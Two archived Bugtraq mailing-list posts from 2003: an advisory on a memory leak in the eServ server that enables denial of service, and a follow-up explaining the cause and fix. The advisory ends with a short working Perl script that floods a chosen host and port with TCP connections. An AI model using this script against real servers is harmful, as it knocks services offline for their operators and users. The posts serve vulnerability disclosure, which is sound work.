=== Content from marc.info_c62d2920_20250124_234422.html ===

```
[[prev in list](?l=bugtraq&m=105284589927655&w=2)] [[next in list](?l=bugtraq&m=105284689228961&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    eServ Memory Leak Solution
From:       ["mattmurphy () kc ! rr ! com" <mattmurphy () kc ! rr ! com>](?a=103356496200001&r=1&w=2)
Date:       [2003-05-13 16:38:00](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105284631428187&q=mbox) or [body](?l=bugtraq&m=105284631428187&q=raw)]

After discussion with Andrey Cherezov, the cause and solution of the eServ
memory "leak" has been identified.  Delayed de-allocation associated with
thread creation and destruction caused the issue.  eServ 2.9x was
vulnerable to my attacks because during the delay (up to a few minutes), it
continued spawning threads, resulting in a denial of service.  eServ 3.0
uses a new acTCP kernel to improve service.  Specifically, it does not
create new threads beyond its maximum connection queue.  The delay
condition still exists, but cannot be exploited to cause major memory loss.
I recommend that eServ 2.9x users contact the vendor about upgrading as
appropriate.

eServ has had one other vulnerability, a buffer overrun in its virtual host
support.  Stating that eServ has a "horrible security record" was perhaps a
horrible overstatement on my part. :-)

There have been other vulnerabilities in products un-related to eServ,
which were developed on the same kernel.  Specifically, acFTP's
authentication logging bug, and the acFreeProxy XSS, which I have been
informed was the result of a configuration error.

I was also informed during discussions with the developer that the reason
my e-mail was not replied to immediately was because of Russia's day of
victory celebrations, and not due to negligence.

--------------------------------------------------------------------
mail2web - Check your email from the web at
<http://mail2web.com/> .

[[prev in list](?l=bugtraq&m=105284589927655&w=2)] [[next in list](?l=bugtraq&m=105284689228961&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_1feb7f66_20250124_234422.html ===

```
[[prev in list](?l=bugtraq&m=105284851831232&w=2)] [[next in list](?l=bugtraq&m=105275485606646&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    eServ Memory Leak Enables Denial of Service Attacks
From:       ["Matthew Murphy" <mattmurphy () kc ! rr ! com>](?a=101932969400003&r=1&w=2)
Date:       [2003-05-11 16:21:43](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105284630228137&q=mbox) or [body](?l=bugtraq&m=105284630228137&q=raw)]

eServ Memory Leak Enables Denial of Service Attacks

I. Product Description

eServ is a hybrid Web server (HTTP), FTP server, mail server (POP3, SMTP,
Finger), news server (NNTP), and proxy server.  It provides all these
services in a single package, so that administrators are not required to run
multiple different packages to support these protocols.

II. Vulnerability Description

eServ's connection handling routine contains a memory leak that may be
exploited to cause the eServ daemon to become unavailable.  Upon receiving a
connection, the server allocates a block of memory on the heap between 8 and
32 kilobytes in size.  The reason for this size variance was not isolated.
This block of memory is not freed on disconnect, leading it to leak.  After
several thousand successful connections, memory use on the system becomes
exceedingly high.  If memory use on the system becomes excessively high, the
system may become unusable.

III. Impact

An attacker who can repeatedly establish connections with the eServ daemon
can cause services running on the vulnerable system (including other
services outside of eServ's process) to fail.  The vulnerability can
actually be exploited by accident on high-traffic sites -- each connection
causes a leak.  After about 1,000 connections, anywhere between 7.81 MB and
31.25 MB may leak.

To deprive an average server system of resources to the point of failure, a
significant number of connections is required.  After 10,000 connections,
78.1 MB to 312.5 MB may leak; in my experience, about 50,000 connections is
sufficient to cause system failure.  At this point, 390.5 MB to 1.52 GB has
leaked.

IV. Vendor Contact

I attempted to contact the vendor via info@eserv.ru and support@eserv.ru.
The former address bounced, and no response was received from the second
contact attempt.  eServ has a horrible security record, and I recommend
using a production server for internet sites.

V. Exploit

#!/usr/bin/perl
#LEGAL NOTICE: Don't test this on networks you don't administer,
#and do not test this tool on networks you don't own without
#permission of the network owner.  You are responsible for all
#damage due to your use of this tool.
use IO::Socket;
print "$0: eServ Remote DoS Exploit\r\n";
print "By Matthew Murphy \<mattmurphy\@kc.rr.com\>\r\n\r\n";
print "Server hostname\: ";
$host = trim(chomp($line = <STDIN>));
print "Service port to probe\: ";
$port = trim(chomp($line = <STDIN>));
print "\r\nBeginning probe -- stop with CTRL+C\r\n";
while (1) {
 $f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host:$port");
 undef $f;
}

[[prev in list](?l=bugtraq&m=105284851831232&w=2)] [[next in list](?l=bugtraq&m=105275485606646&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


